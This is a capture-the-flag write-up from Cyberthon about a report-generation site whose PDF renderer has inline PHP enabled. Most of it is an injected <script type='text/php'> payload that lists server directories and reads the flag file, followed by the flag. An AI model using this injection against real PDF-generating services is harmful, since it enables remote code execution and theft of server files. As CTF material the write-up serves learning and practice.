---
ai_date: 2025-04-27 05:11:55
ai_summary: Flag found via PHP injection, revealing file contents
ai_tags:
  - php
  - rce
  - xss
created: 2024-06-11T01:33
updated: 2025-07-14T09:46
---

> We found a site which APOCALYPSE uses for report generation.
>
> Server seems secured! Obtain the flag residing in the server.
> The URL for this challenge:
> http://chals.cyberthon22f.ctf.sg:40101

According to the Github Issue, to add page numbers, php is enabled, so...

By using PHP injection

We get our flag

```html
Hello World
<script type="text/php">
$pdf->text(100, 150, json_encode(scandir('.')), $fontMetrics->getFont("Arial"), 10, array(0, 0, 0));
$pdf->text(100, 160, json_encode(scandir('..')), $fontMetrics->getFont("Arial"), 10, array(0, 0, 0));
$pdf->text(100, 170, json_encode(scandir('reports')), $fontMetrics->getFont("Arial"), 10, array(0, 0, 0));
$pdf->text(100, 200, file_get_contents("reports/266AB791560203B1D926F59E814ED4F820184D74.flag"), $fontMetrics->getFont("Arial"), 10, array(0, 0, 0));
</script>
```

![Screenshot 2022-05-07 at 10.04.19 AM](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718084090/2024/06/013ab3fb99578922c21d2147e2d7a71c.png)

`Cyberthon{RCE_is_NOT_everything_!}`